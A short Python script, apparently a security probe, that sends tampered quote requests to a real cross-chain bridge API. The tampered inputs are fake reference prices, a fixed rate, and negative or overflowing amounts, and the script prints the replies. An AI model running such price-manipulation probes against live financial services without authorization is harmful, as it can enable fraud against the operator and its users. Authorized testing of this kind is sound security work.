import json, urllib.request, urllib.error
BASE="https://api.relay.link"
U="0x48A7F32009473dE12582911CF0782e5268F2B9E4"
ETH="0x0000000000000000000000000000000000000000"
USDС="0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"
def post(p,b,t=30):
    d=json.dumps(b).encode()
    r=urllib.request.Request(BASE+p,data=d,headers={"content-type":"application/json","accept":"application/json"},method="POST")
    try:
        with urllib.request.urlopen(r,timeout=t) as x: return x.status,x.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()
    except Exception as e: return 0,f"ERR {e}"

base={"user":U,"originChainId":1,"destinationChainId":8453,
      "originCurrency":ETH,"destinationCurrency":USDС,
      "amount":"10000000000000000","tradeType":"EXACT_INPUT"}

print("### BASELINE quote (0.01 ETH -> USDC base)\n")
s,b=post("/quote/v2",base)
print(s, b[:700])
if s==200:
    d=json.loads(b)
    det=d.get("details",{})
    print("\n  currencyOut:",det.get("currencyOut",{}).get("amountFormatted"))
    print("  totalImpact:",det.get("totalImpact",{}).get("percent"))
    print("  timeEstimate:",det.get("timeEstimate"))

print("\n\n### TEST: referencePrice palsu (1 ETH = 1 USDC)\n")
evil=dict(base); evil["referencePrice"]="0.000001"
s,b=post("/quote/v2",evil)
print(s, b[:400])
if s==200:
    d=json.loads(b); print("  out:",d.get("details",{}).get("currencyOut",{}).get("amountFormatted"))

print("\n### TEST: fixedRate palsu\n")
evil2=dict(base); evil2["fixedRate"]="999999"
s,b=post("/quote/v2",evil2)
print(s, b[:400])
if s==200:
    d=json.loads(b); print("  out:",d.get("details",{}).get("currencyOut",{}).get("amountFormatted"))

print("\n### TEST: amount overflow / negatif\n")
for amt in ["0","-1","999999999999999999999999999999999999"]:
    e=dict(base); e["amount"]=amt
    s,b=post("/quote/v2",e)
    print(f"  amount={amt:40} -> {s} {b[:150]}")
